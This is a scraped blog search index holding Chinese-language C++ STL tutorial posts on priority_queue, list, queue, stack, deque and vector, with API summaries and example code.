1234567priority_queue&lt;int, deque&lt;int&gt;&gt; pq;priority_queue&lt;int, vector&lt;int&gt;&gt; pq; pq.empty() pq.size() pq.top() pq.pop() pq.push(item) 1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;using namespace std;#include &quot;queue&quot; void main81()&#123; priority_queue&lt;int&gt; p1; //默认是 最大值优先级队列 //priority_queue&lt;int, vector&lt;int&gt;, less&lt;int&gt; &gt; p1; //相当于这样写 priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; p2; //最小值优先级队列 p1.push(33); p1.push(11); p1.push(55); p1.push(22); cout &lt;&lt;&quot;队列大小&quot; &lt;&lt; p1.size() &lt;&lt; endl; cout &lt;&lt;&quot;队头&quot; &lt;&lt; p1.top() &lt;&lt; endl; while (p1.size() &gt; 0) &#123; cout &lt;&lt; p1.top() &lt;&lt; &quot; &quot;; p1.pop(); &#125; cout &lt;&lt; endl; cout &lt;&lt; &quot;测试 最小值优先级队列&quot; &lt;&lt; endl; p2.push(33); p2.push(11); p2.push(55); p2.push(22); while (p2.size() &gt; 0) &#123; cout &lt;&lt; p2.top() &lt;&lt; &quot; &quot;; p2.pop(); &#125;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"List容器","slug":"cpp0083-List容器","date":"2021-07-05T05:52:34.000Z","updated":"2021-12-28T18:39:58.208Z","comments":true,"path":"2021/07/05/cpp0083-List容器/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/05/cpp0083-List容器/","excerpt":"","text":"List容器 list是一个双向链表容器，可高效地进行插入删除元素。 list不可以随机存取元素，所以不支持at.(pos)函数与[]操作符。It++(ok) it+5(err) #include&lt;list&gt; list对象的默认构造 123456list采用采用模板类实现,对象的默认构造形式：list&lt;T&gt; lstT; 如：list&lt;int&gt; lstInt; //定义一个存放int的list容器。list&lt;float&gt; lstFloat; //定义一个存放float的list容器。list&lt;string&gt; lstString; //定义一个存放string的list容器。... //尖括号内还可以设置指针类型或自定义类型。 list头尾的添加移除操作 1234list.push_back(elem); //在容器尾部加入一个元素list.pop_back(); //删除容器中最后一个元素list.push_front(elem); //在容器开头插入一个元素list.pop_front(); //从容器开头移除第一个元素 12345678910111213list&lt;int&gt; lstInt; lstInt.push_back(1); lstInt.push_back(3); lstInt.push_back(5); lstInt.push_back(7); lstInt.push_back(9); lstInt.pop_front(); lstInt.pop_front(); lstInt.push_front(11); lstInt.push_front(13); lstInt.pop_back(); lstInt.pop_back();// lstInt &#123;13,11,5&#125; list的数据存取 12list.front(); //返回第一个元素。list.back(); //返回最后一个元素。 1234567891011list&lt;int&gt; lstInt; lstInt.push_back(1); lstInt.push_back(3); lstInt.push_back(5); lstInt.push_back(7); lstInt.push_back(9); int iFront = lstInt.front(); //1 int iBack = lstInt.back(); //9 lstInt.front() = 11; //11 lstInt.back() = 19; //19 list与迭代器 1234list.begin(); //返回容器中第一个元素的迭代器。list.end(); //返回容器中最后一个元素之后的迭代器。list.rbegin(); //返回容器中倒数第一个元素的迭代器。list.rend(); //返回容器中倒数最后一个元素的后面的迭代器。 123456789101112131415161718list&lt;int&gt; lstInt; lstInt.push_back(1); lstInt.push_back(3); lstInt.push_back(5); lstInt.push_back(7); lstInt.push_back(9); for (list&lt;int&gt;::iterator it=lstInt.begin(); it!=lstInt.end(); ++it) &#123; cout &lt;&lt; *it; cout &lt;&lt; &quot; &quot;; &#125; for (list&lt;int&gt;::reverse_iterator rit=lstInt.rbegin(); rit!=lstInt.rend(); ++rit) &#123; cout &lt;&lt; *rit; cout &lt;&lt; &quot; &quot;; &#125; list对象的带参数构造 123list(beg,end); //构造函数将[beg, end)区间中的元素拷贝给本身。注意该区间是左闭右开的区间。list(n,elem); //构造函数将n个elem拷贝给本身。list(const list &amp;lst); //拷贝构造函数。 12345678910list&lt;int&gt; lstIntA; lstIntA.push_back(1); lstIntA.push_back(3); lstIntA.push_back(5); lstIntA.push_back(7); lstIntA.push_back(9); list&lt;int&gt; lstIntB(lstIntA.begin(),lstIntA.end()); //1 3 5 7 9 list&lt;int&gt; lstIntC(5,8); //8 8 8 8 8 list&lt;int&gt; lstIntD(lstIntA); //1 3 5 7 9 list的赋值 1234list.assign(beg,end); //将[beg, end)区间中的数据拷贝赋值给本身。注意该区间是左闭右开的区间。list.assign(n,elem); //将n个elem拷贝赋值给本身。list&amp; operator=(const list &amp;lst); //重载等号操作符list.swap(lst); // 将lst与本身的元素互换。 1234567891011list&lt;int&gt; lstIntA,lstIntB,lstIntC,lstIntD; lstIntA.push_back(1); lstIntA.push_back(3); lstIntA.push_back(5); lstIntA.push_back(7); lstIntA.push_back(9); lstIntB.assign(lstIntA.begin(),lstIntA.end()); //1 3 5 7 9 lstIntC.assign(5,8); //8 8 8 8 8 lstIntD = lstIntA; //1 3 5 7 9 lstIntC.swap(lstIntD); //互换 list的大小 1234list.size(); //返回容器中元素的个数list.empty(); //判断容器是否为空list.resize(num); //重新指定容器的长度为num，若容器变长，则以默认值填充新位置。如果容器变短，则末尾超出容器长度的元素被删除。list.resize(num, elem); //重新指定容器的长度为num，若容器变长，则以elem值填充新位置。如果容器变短，则末尾超出容器长度的元素被删除。 123456789101112list&lt;int&gt; lstIntA; lstIntA.push_back(1); lstIntA.push_back(3); lstIntA.push_back(5); if (!lstIntA.empty()) &#123; int iSize = lstIntA.size(); //3 lstIntA.resize(5); //1 3 5 0 0 lstIntA.resize(7,1); //1 3 5 0 0 1 1 lstIntA.resize(2); //1 3 &#125; list的插入 123list.insert(pos,elem); //在pos位置插入一个elem元素的拷贝，返回新数据的位置。list.insert(pos,n,elem); //在pos位置插入n个elem数据，无返回值。list.insert(pos,beg,end); //在pos位置插入[beg,end)区间的数据，无返回值。 1234567891011121314151617list&lt;int&gt; lstA; list&lt;int&gt; lstB; lstA.push_back(1); lstA.push_back(3); lstA.push_back(5); lstA.push_back(7); lstA.push_back(9); lstB.push_back(2); lstB.push_back(4); lstB.push_back(6); lstB.push_back(8); lstA.insert(lstA.begin(), 11); //&#123;11, 1, 3, 5, 7, 9&#125; lstA.insert(++lstA.begin(),2,33); //&#123;11,33,33,1,3,5,7,9&#125; lstA.insert(lstA.begin() , lstB.begin() , lstB.end() ); //&#123;2,4,6,8,11,33,33,1,3,5,7,9&#125; list的删除 1234list.clear(); //移除容器的所有数据list.erase(beg,end); //删除[beg,end)区间的数据，返回下一个数据的位置。list.erase(pos); //删除pos位置的数据，返回下一个数据的位置。list.remove(elem); //删除容器中所有与elem值匹配的元素。 1234567891011121314151617181920212223242526272829303132//删除区间内的元素lstInt是用list&lt;int&gt; //声明的容器，现已包含按顺序的1,3,5,6,9元素。list&lt;int&gt;::iterator itBegin=lstInt.begin();++ itBegin;list&lt;int&gt;::iterator itEnd=lstInt.begin();++ itEnd;++ itEnd;++ itEnd;lstInt.erase(itBegin,itEnd);//此时容器lstInt包含按顺序的1,6,9三个元素。//假设 lstInt 包含1,3,2,3,3,3,4,3,5,3，删除容器中等于3的元素的方法一for(list&lt;int&gt;::iterator it=lstInt.being(); it!=lstInt.end(); ) //小括号里不需写 ++it&#123; if(*it == 3) &#123; it = lstInt.erase(it); //以迭代器为参数，删除元素3，并把数据删除后的下一个元素位置返回给迭代器。 //此时，不执行 ++it； &#125; else &#123; ++it; &#125;&#125;//删除容器中等于3的元素的方法二lstInt.remove(3);//删除lstInt的所有元素lstInt.clear(); //容器为空 list的反序排列 1list.reverse(); //反转链表，比如lst包含1,3,5元素，运行此方法后，lst就包含5,3,1元素。 123456789list&lt;int&gt; lstA; lstA.push_back(1); lstA.push_back(3); lstA.push_back(5); lstA.push_back(7); lstA.push_back(9); lstA.reverse(); //9 7 5 3 1 list排序 1234567list.sort(); //默认从小到大改变规则需要提供回调函数例如比较两个int类型的回调函数bool Compare(const int&amp; x,const int&amp; y) &#123; return x &gt; y;&#125; 1234567891011121314151617181920bool Compare(const int&amp; x,const int&amp; y) &#123; return x &gt; y;&#125;void test01() &#123; list&lt;int&gt; li; li.push_back(10); li.push_back(20); li.push_back(40); li.push_back(1); li.push_back(2); li.sort(Compare); for (list&lt;int&gt;::iterator it = li.begin(); it != li.end();it++) &#123; cout &lt;&lt; *it &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl;&#125; 一、容器deque的使用方法 ​ 适合 在头尾添加移除元素。使用方法与vector类似。 二、容器queue,stack的使用方法 ​ 适合队列，堆栈的操作方式。 三、容器list的使用方法 ​ 适合在任意位置快速插入移除元素","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"Queue容器","slug":"cpp0082-Queue容器","date":"2021-07-05T05:48:08.000Z","updated":"2021-12-28T18:39:55.603Z","comments":true,"path":"2021/07/05/cpp0082-Queue容器/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/05/cpp0082-Queue容器/","excerpt":"","text":"Queue容器 queue是队列容器，是一种“先进先出”的容器。 queue是简单地装饰deque容器而成为另外的一种容器。 #include &lt;queue&gt; queue对象的默认构造 123456queue采用模板类实现，queue对象的默认构造形式：queue&lt;T&gt; queT; 如：queue&lt;int&gt; queInt; //一个存放int的queue容器。queue&lt;float&gt; queFloat; //一个存放float的queue容器。queue&lt;string&gt; queString; //一个存放string的queue容器。... //尖括号内还可以设置指针类型或自定义类型。 queue的push()与pop()方法 12queue.push(elem); //往队尾添加元素queue.pop(); //从队头移除第一个元素 123456queue&lt;int&gt; queInt;queInt.push(1);queInt.push(3);queInt.push(5);queInt.push(7);queInt.push(9);queInt.pop();queInt.pop();此时queInt存放的元素是5,7,9 queue对象的拷贝构造与赋值 12queue(const queue &amp;que); //拷贝构造函数queue&amp; operator=(const queue &amp;que); //重载等号操作符 12345678910queue&lt;int&gt; queIntA; queIntA.push(1); queIntA.push(3); queIntA.push(5); queIntA.push(7); queIntA.push(9); queue&lt;int&gt; queIntB(queIntA); //拷贝构造 queue&lt;int&gt; queIntC; queIntC = queIntA; //赋值 queue的数据存取 12queue.back(); //返回最后一个元素queue.front(); //返回第一个元素 123456789101112queue&lt;int&gt; queIntA; queIntA.push(1); queIntA.push(3); queIntA.push(5); queIntA.push(7); queIntA.push(9); int iFront = queIntA.front(); //1 int iBack = queIntA.back(); //9 queIntA.front() = 11; //11 queIntA.back() = 19; //19 queue的大小 12queue.empty(); //判断队列是否为空queue.size(); //返回队列的大小 1234567891011queue&lt;int&gt; queIntA; queIntA.push(1); queIntA.push(3); queIntA.push(5); queIntA.push(7); queIntA.push(9); if (!queIntA.empty()) &#123; int iSize = queIntA.size(); //5 &#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"stack容器","slug":"cpp0081-stack容器","date":"2021-07-05T05:40:14.000Z","updated":"2021-12-28T18:39:52.927Z","comments":true,"path":"2021/07/05/cpp0081-stack容器/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/05/cpp0081-stack容器/","excerpt":"","text":"stack容器 Stack简介 stack是堆栈容器，是一种“先进后出”的容器。 stack是简单地装饰deque容器而成为另外的一种容器。 #include &lt;stack&gt; stack对象的默认构造 123456stack采用模板类实现， stack对象的默认构造形式： stack &lt;T&gt; stkT; stack &lt;int&gt; stkInt; //一个存放int的stack容器。stack &lt;float&gt; stkFloat; //一个存放float的stack容器。stack &lt;string&gt; stkString; //一个存放string的stack容器。... //尖括号内还可以设置指针类型或自定义类型。 stack的push()与pop()方法 12stack.push(elem); //往栈头添加元素stack.pop(); //从栈头移除第一个元素 123456stack&lt;int&gt; stkInt; stkInt.push(1);stkInt.push(3);stkInt.pop(); stkInt.push(5);stkInt.push(7); stkInt.push(9);stkInt.pop(); stkInt.pop(); 此时stkInt存放的元素是1,5 stack对象的拷贝构造与赋值 12stack(const stack &amp;stk); //拷贝构造函数stack&amp; operator=(const stack &amp;stk); //重载等号操作符 12345678910stack&lt;int&gt; stkIntA;stkIntA.push(1);stkIntA.push(3);stkIntA.push(5);stkIntA.push(7);stkIntA.push(9);stack&lt;int&gt; stkIntB(stkIntA); //拷贝构造stack&lt;int&gt; stkIntC;stkIntC = stkIntA; //赋值 stack的数据存取 1stack.top(); //返回最后一个压入栈元素 1234567891011stack&lt;int&gt; stkIntA; stkIntA.push(1); stkIntA.push(3); stkIntA.push(5); stkIntA.push(7); stkIntA.push(9); int iTop = stkIntA.top(); //9 stkIntA.top() = 19; //19 stack的大小 12stack.empty(); //判断堆栈是否为空stack.size(); //返回堆栈的大小 1234567891011stack&lt;int&gt; stkIntA; stkIntA.push(1); stkIntA.push(3); stkIntA.push(5); stkIntA.push(7); stkIntA.push(9); if (!stkIntA.empty()) &#123; int iSize = stkIntA.size(); //5 &#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"deque容器","slug":"cpp0080-STL的Deque容器","date":"2021-07-01T05:05:02.000Z","updated":"2021-12-28T18:39:50.012Z","comments":true,"path":"2021/07/01/cpp0080-STL的Deque容器/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/01/cpp0080-STL的Deque容器/","excerpt":"","text":"Deque简介 deque是“double-ended queue”的缩写，和vector一样都是STL的容器，deque是双端数组，而vector是单端的。 deque在接口上和vector非常相似，在许多操作的地方可以直接替换。 deque可以随机存取元素（支持索引值直接存取， 用[]操作符或at()方法，这个等下会详讲）。 deque头部和尾部添加或移除元素都非常快速。但是在中部安插元素或移除元素比较费时。 #include &lt;deque&gt; deque对象的默认构造 1234567deque采用模板类实现，deque对象的默认构造形式：deque&lt;T&gt; deqT; deque &lt;int&gt; deqInt; //一个存放int的deque容器。deque &lt;float&gt; deq Float; //一个存放float的deque容器。deque &lt;string&gt; deq String; //一个存放string的deque容器。... //尖括号内还可以设置指针类型或自定义类型。 deque末尾的添加移除操作 1234deque.push_back(elem); //在容器尾部添加一个数据deque.push_front(elem); //在容器头部插入一个数据deque.pop_back(); //删除容器最后一个数据deque.pop_front(); //删除容器第一个数据 12345678910111213deque&lt;int&gt; deqInt; deqInt.push_back(1); deqInt.push_back(3); deqInt.push_back(5); deqInt.push_back(7); deqInt.push_back(9); deqInt.pop_front(); deqInt.pop_front(); deqInt.push_front(11); deqInt.push_front(13); deqInt.pop_back(); deqInt.pop_back();//deqInt &#123; 13,11,5&#125; deque的数据存取 1234deque.at(idx); //返回索引idx所指的数据，如果idx越界，抛出out_of_range。deque[idx]; //返回索引idx所指的数据，如果idx越界，不抛出异常，直接出错。deque.front(); //返回第一个数据。deque.back(); //返回最后一个数据 12345678910111213141516deque&lt;int&gt; deqInt; deqInt.push_back(1); deqInt.push_back(3); deqInt.push_back(5); deqInt.push_back(7); deqInt.push_back(9); int iA = deqInt.at(0); //1 int iB = deqInt[1]; //3 deqInt.at(0) = 99; //99 deqInt[1] = 88; //88 int iFront = deqInt.front(); //99 int iBack = deqInt.back(); //9 deqInt.front() = 77; //77 deqInt.back() = 66; //66 deque与迭代器 1234deque.begin(); //返回容器中第一个元素的迭代器。deque.end(); //返回容器中最后一个元素之后的迭代器。deque.rbegin(); //返回容器中倒数第一个元素的迭代器。deque.rend(); //返回容器中倒数最后一个元素之后的迭代器。 1234567891011121314151617181920deque&lt;int&gt; deqInt; deqInt.push_back(1); deqInt.push_back(3); deqInt.push_back(5); deqInt.push_back(7); deqInt.push_back(9); for (deque&lt;int&gt;::iterator it=deqInt.begin(); it!=deqInt.end(); ++it) &#123; cout &lt;&lt; *it; cout &lt;&lt; &quot;&quot;; &#125; // 1 3 5 7 9 for (deque&lt;int&gt;::reverse_iterator rit=deqInt.rbegin(); rit!=deqInt.rend(); ++rit) &#123; cout &lt;&lt; *rit; cout &lt;&lt; &quot;&quot;; &#125; //9 7 5 3 1 deque对象的带参数构造 123deque(beg,end); //构造函数将[beg, end)区间中的元素拷贝给本身。注意该区间是左闭右开的区间。deque(n,elem); //构造函数将n个elem拷贝给本身。deque(const deque &amp;deq); //拷贝构造函数。 12345678910deque&lt;int&gt; deqIntA; deqIntA.push_back(1); deqIntA.push_back(3); deqIntA.push_back(5); deqIntA.push_back(7); deqIntA.push_back(9); deque&lt;int&gt; deqIntB(deqIntA.begin(),deqIntA.end()); //1 3 5 7 9 deque&lt;int&gt; deqIntC(5,8); //8 8 8 8 8 deque&lt;int&gt; deqIntD(deqIntA); //1 3 5 7 9 deque的赋值 1234deque.assign(beg,end); //将[beg, end)区间中的数据拷贝赋值给本身。注意该区间是左闭右开的区间。deque.assign(n,elem); //将n个elem拷贝赋值给本身。deque&amp; operator=(const deque &amp;deq); //重载等号操作符 deque.swap(deq); // 将vec与本身的元素互换 1234567891011121314deque&lt;int&gt; deqIntA,deqIntB,deqIntC,deqIntD; deqIntA.push_back(1); deqIntA.push_back(3); deqIntA.push_back(5); deqIntA.push_back(7); deqIntA.push_back(9); deqIntB.assign(deqIntA.begin(),deqIntA.end()); // 1 3 5 7 9 deqIntC.assign(5,8); //8 8 8 8 8 deqIntD = deqIntA; //1 3 5 7 9 deqIntC.swap(deqIntD); //互换 deque的大小 1234deque.size(); //返回容器中元素的个数deque.empty(); //判断容器是否为空deque.resize(num); //重新指定容器的长度为num，若容器变长，则以默认值填充新位置。如果容器变短，则末尾超出容器长度的元素被删除。deque.resize(num, elem); //重新指定容器的长度为num，若容器变长，则以elem值填充新位置。如果容器变短，则末尾超出容器长度的元素被删除。 12345678910111213deque&lt;int&gt; deqIntA;deqIntA.push_back(1);deqIntA.push_back(3);deqIntA.push_back(5);int iSize = deqIntA.size(); //3if (!deqIntA.empty()) &#123; deqIntA.resize(5); //1 3 5 0 0 deqIntA.resize(7,1); //1 3 5 0 0 1 1 deqIntA.resize(2); //1 3 &#125; deque的插入 123deque.insert(pos,elem); //在pos位置插入一个elem元素的拷贝，返回新数据的位置。deque.insert(pos,n,elem); //在pos位置插入n个elem数据，无返回值。deque.insert(pos,beg,end); //在pos位置插入[beg,end)区间的数据，无返回值。 1234567891011121314151617deque&lt;int&gt; deqA; deque&lt;int&gt; deqB; deqA.push_back(1); deqA.push_back(3); deqA.push_back(5); deqA.push_back(7); deqA.push_back(9); deqB.push_back(2); deqB.push_back(4); deqB.push_back(6); deqB.push_back(8); deqA.insert(deqA.begin(), 11); //&#123;11, 1, 3, 5, 7, 9&#125; deqA.insert(deqA.begin()+1,2,33); //&#123;11,33,33,1,3,5,7,9&#125; deqA.insert(deqA.begin() , deqB.begin() , deqB.end() ); //&#123;2,4,6,8,11,33,33,1,3,5,7,9&#125; deque的删除 123deque.clear(); //移除容器的所有数据deque.erase(beg,end); //删除[beg,end)区间的数据，返回下一个数据的位置。deque.erase(pos); //删除pos位置的数据，返回下一个数据的位置。 12345678910111213141516171819202122232425删除区间内的元素deqInt是用deque&lt;int&gt;声明的容器，现已包含按顺序的1,3,5,6,9元素。deque&lt;int&gt;::iterator itBegin=deqInt.begin()+1;deque&lt;int&gt;::iterator itEnd=deqInt.begin()+3;deqInt.erase(itBegin,itEnd);//此时容器deqInt包含按顺序的1,6,9三个元素。假设 deqInt 包含1,3,2,3,3,3,4,3,5,3，删除容器中等于3的元素for(deque&lt;int&gt;::iterator it=deqInt.being(); it!=deqInt.end(); ) //小括号里不需写 ++it&#123; if(*it == 3) &#123; it = deqInt.erase(it); //以迭代器为参数，删除元素3，并把数据删除后的下一个元素位置返回给迭代器。 //此时，不执行 ++it； &#125; else &#123; ++it; &#125;&#125;//删除deqInt的所有元素deqInt.clear(); //容器为空 基本操作代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;deque&gt;using namespace std;//deque容器初始化void test01()&#123; deque&lt;int&gt; d1; //默认构造函数 deque&lt;int&gt; d2(10,5); //带参数构造函数 deque&lt;int&gt; d3(d2.begin(),d2.end()); deque&lt;int&gt; d4(d3); //拷贝构造&#125;//deque赋值操作void test02()&#123; deque&lt;int&gt; d1(10, 3); deque&lt;int&gt; d; //d.assign(10,5); 赋值 //d.assign(d1.begin(),d1.end()); d = d1; //重载= 赋值&#125;//大小操作void test03()&#123; deque&lt;int&gt; d1(10, 3); cout &lt;&lt; d1.size() &lt;&lt; endl; if (d1.empty())&#123; cout &lt;&lt; \"空！\" &lt;&lt; endl; &#125; else&#123; cout &lt;&lt; \"不空!\" &lt;&lt; endl; &#125; //d1.resize(5); //cout &lt;&lt; d1.size() &lt;&lt; endl; d1.resize(15);&#125;//deque插入和删除void test04()&#123; deque&lt;int&gt; d; d.push_back(10); d.push_back(20); d.push_front(30); d.push_front(40); //第一种遍历方式 for (int i = 0; i &lt; d.size();i++)&#123; cout &lt;&lt; d[i] &lt;&lt; \" \"; &#125; cout &lt;&lt; endl; //第二种遍历方式 for (int i = 0; i &lt; d.size(); i++)&#123; cout &lt;&lt; d.at(i) &lt;&lt; \" \"; &#125; cout &lt;&lt; endl; //第三种方式 for (deque&lt;int&gt;::iterator it = d.begin(); it != d.end(); it++)&#123; cout &lt;&lt; *it &lt;&lt; \" \"; &#125; cout &lt;&lt; endl; //删除元素 /* while (d.size() &gt; 0)&#123; cout &lt;&lt; d.back() &lt;&lt; \"被删除!\" &lt;&lt; endl; d.pop_back(); &#125; cout &lt;&lt; \"大小:\" &lt;&lt; d.size() &lt;&lt; endl; */ //头删除 while (!d.empty())&#123; cout &lt;&lt; d.front() &lt;&lt; \"被删除!\" &lt;&lt; endl; d.pop_front(); &#125;&#125;//deque容器插入void test06()&#123; deque&lt;int&gt; d; d.insert(d.begin(),100); //头插法 d.insert(d.end(), 200); //尾差法 for (deque&lt;int&gt;::iterator it = d.begin(); it != d.end(); it++)&#123; cout &lt;&lt; *it &lt;&lt; \" \"; &#125; cout &lt;&lt; endl;&#125;int main()&#123; //test03(); //test04(); test06(); system(\"pause\"); return EXIT_SUCCESS;&#125; 案例代码 sort排序第三个参数是判断规则函数 123456bool mycompare(int v1,int v2)&#123; return v1 &gt; v2; // 排序从大大小 //return v1 &lt; v2; //从小到大 &#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;vector&gt;#include&lt;deque&gt;#include&lt;algorithm&gt;using namespace std;//选手类class Player&#123;public: Player(string name, int score) :name(name), score(score)&#123;&#125; string name; int score; //分数&#125;;//创建选手void Create_Player(vector&lt;Player&gt;&amp; v)&#123; string nameseed = \"ABCDE\"; for (int i = 0; i &lt; 5;i++)&#123; string name = \"选手\"; name += nameseed[i]; Player p(name,0); //创建选手 v.push_back(p); &#125;&#125;//打分bool mycompare(int v1,int v2)&#123; if (v1 &gt; v2)&#123; //从大到小 return true; &#125; else&#123; return false; &#125;&#125;void Set_Player_Score(vector&lt;Player&gt;&amp; plist)&#123; for (vector&lt;Player&gt;::iterator it = plist.begin(); it != plist.end();it++)&#123; deque&lt;int&gt; dscore; for (int i = 0; i &lt; 10;i++)&#123; int score = 50 + rand() % 50; //打分 dscore.push_back(score); &#125; //排序 sort sort(dscore.begin(), dscore.end(), mycompare); /* for (deque&lt;int&gt;::iterator it = dscore.begin(); it != dscore.end();it ++)&#123; cout &lt;&lt; *it &lt;&lt; \" \"; &#125; cout &lt;&lt; endl; */ dscore.pop_front(); //去除最高分 dscore.pop_back(); //去除最低分 //分数总结 int totalscore = 0; for (deque&lt;int&gt;::iterator dit = dscore.begin(); dit != dscore.end(); dit++)&#123; totalscore += *dit; &#125; int scoreavg = totalscore / dscore.size(); (*it).score = scoreavg; &#125;&#125;//显示5名选手得分void Show_Player_Score(vector&lt;Player&gt;&amp; plist)&#123; for (vector&lt;Player&gt;::iterator it = plist.begin(); it != plist.end(); it++)&#123; cout &lt;&lt; \"姓名:\" &lt;&lt; it-&gt;name &lt;&lt; \" 分数:\" &lt;&lt; it-&gt;score &lt;&lt; endl; &#125; cout &lt;&lt; endl;&#125;int main()&#123; vector&lt;Player&gt; vPlayer; //存放我们的选手信息 Create_Player(vPlayer); //创建选手 Set_Player_Score(vPlayer); Show_Player_Score(vPlayer); //评委打分案例(sort 算法排序) //创建 5 个选手(姓名，得分)，10 个评委对 5 个选手进行打分 //得分规则：去除最高分，去除最低分，取出平均分 //按得分对 5 名选手进行排名 system(\"pause\"); return EXIT_SUCCESS;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"STL的vector容器","slug":"cpp0079-STL的vector容器","date":"2021-06-29T05:23:08.000Z","updated":"2021-12-28T18:39:45.561Z","comments":true,"path":"2021/06/29/cpp0079-STL的vector容器/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/29/cpp0079-STL的vector容器/","excerpt":"","text":"STL的vector容器 1Vector容器简介 vector是将元素置于一个动态数组中加以管理的容器。 vector可以随机存取元素（支持索引值直接存取， 用[]操作符或at()方法，这个等下会详讲）。 vector尾部添加或移除元素非常快速。但是在中部或头部插入元素或移除元素比较费时 2vector对象的默认构造 vector采用模板类实现，vector对象的默认构造形式 12345678vector&lt;T&gt; vecT; vector&lt;int&gt; vecInt; //一个存放int的vector容器。vector&lt;float&gt; vecFloat; //一个存放float的vector容器。vector&lt;string&gt; vecString; //一个存放string的vector容器。... //尖括号内还可以设置指针类型或自定义类型。Class CA&#123;&#125;;vector&lt;CA*&gt; vecpCA; //用于存放CA对象的指针的vector容器。vector&lt;CA&gt; vecCA; //用于存放CA对象的vector容器。由于容器元素的存放是按值复制的方式进行的，所以此时CA必须提供CA的拷贝构造函数，以保证CA对象间拷贝正常。 3vector对象的带参数构造 1234567891011121314vector(beg,end); //构造函数将[beg, end)区间中的元素拷贝给本身。注意该区间是左闭右开的区间。vector(n,elem); //构造函数将n个elem拷贝给本身。vector(const vector &amp;vec); //拷贝构造函数int iArray[] = &#123;0,1,2,3,4&#125;;vector&lt;int&gt; vecIntA( iArray, iArray+5 );vector&lt;int&gt; vecIntB ( vecIntA.begin() , vecIntA.end() ); //用构造函数初始化容器vecIntB vector&lt;int&gt; vecIntB ( vecIntA.begin() , vecIntA.begin()+3 ); vector&lt;int&gt; vecIntC(3,9); //此代码运行后，容器vecIntB就存放3个元素，每个元素的值是9。vector&lt;int&gt; vecIntD(vecIntA); 4vector的赋值 12345理论知识vector.assign(beg,end); //将[beg, end)区间中的数据拷贝赋值给本身。注意该区间是左闭右开的区间。vector.assign(n,elem); //将n个elem拷贝赋值给本身。vector&amp; operator=(const vector &amp;vec); //重载等号操作符vector.swap(vec); // 将vec与本身的元素互换。 12345678910111213vector&lt;int&gt; vecIntA, vecIntB, vecIntC, vecIntD;int iArray[] = &#123;0,1,2,3,4&#125;;vecIntA.assign(iArray,iArray+5);vecIntB.assign( vecIntA.begin(), vecIntA.end() ); //用其它容器的迭代器作参数。vecIntC.assign(3,9);vector&lt;int&gt; vecIntD;vecIntD = vecIntA;vecIntA.swap(vecIntD); 5vector的大小 12345678910理论知识vector.size(); //返回容器中元素的个数vector.empty(); //判断容器是否为空vector.resize(num); //重新指定容器的长度为num，若容器变长，则以默认值填充新位置。如果容器变短，则末尾超出容器长度的元素被删除。vector.resize(num, elem); //重新指定容器的长度为num，若容器变长，则以elem值填充新位置。如果容器变短，则末尾超出容器长度的元素被删除。vi.reserve(num); //设置容量 123456例如 vecInt是vector&lt;int&gt; 声明的容器，现已包含1,2,3元素。int iSize = vecInt.size(); //iSize == 3;bool bEmpty = vecInt.empty(); // bEmpty == false;执行vecInt.resize(5); //此时里面包含1,2,3,0,0元素。再执行vecInt.resize(8,3); //此时里面包含1,2,3,0,0,3,3,3元素。再执行vecInt.resize(2); //此时里面包含1,2元素。 6vector末尾的添加移除操作 123456789vector&lt;int&gt; vecInt;vecInt.push_back(1); //在容器尾部加入一个元素vecInt.push_back(3); vecInt.push_back(5); vecInt.push_back(7); vecInt.push_back(9); vecInt.pop_back(); //移除容器中最后一个元素vecInt.pop_back();//&#123;5 ,7 ,9&#125; 7vector的数据存取 12345678910111213理论知识vec.at(idx); //返回索引idx所指的数据，如果idx越界，抛出out_of_range异常。vec[idx]; //返回索引idx所指的数据，越界时，运行直接报错vector&lt;int&gt; vecInt; //假设包含1 ,3 ,5 ,7 ,9vecInt.at(2) == vecInt[2] ; //5vecInt.at(2) = 8; 或 vecInt[2] = 8;vecInt 就包含 1, 3, 8, 7, 9值int iF = vector.front(); //iF==1int iB = vector.back(); //iB==9vector.front() = 11; //vecInt包含&#123;11,3,8,7,9&#125;vector.back() = 19; //vecInt包含&#123;11,3,8,7,19&#125; 8迭代器基本原理 迭代器是一个“可遍历STL容器内全部或部分元素”的对象。 迭代器指出容器中的一个特定位置。 迭代器就如同一个指针。 迭代器提供对一个容器中的对象的访问方法，并且可以定义了容器中对象的范围。 这里大概介绍一下迭代器的类别。 输入迭代器：也有叫法称之为“只读迭代器”，它从容器中读取元素，只能一次读入一个元素向前移动，只支持一遍算法，同一个输入迭代器不能两遍遍历一个序列。 输出迭代器：也有叫法称之为“只写迭代器”，它往容器中写入元素，只能一次写入一个元素向前移动，只支持一遍算法，同一个输出迭代器不能两遍遍历一个序列。 正向迭代器：组合输入迭代器和输出迭代器的功能，还可以多次解析一个迭代器指定的位置，可以对一个值进行多次读/写。 双向迭代器：组合正向迭代器的功能，还可以通过–操作符向后移动位置。 随机访问迭代器：组合双向迭代器的功能，还可以向前向后跳过任意个位置，可以直接访问容器中任何位置的元素。 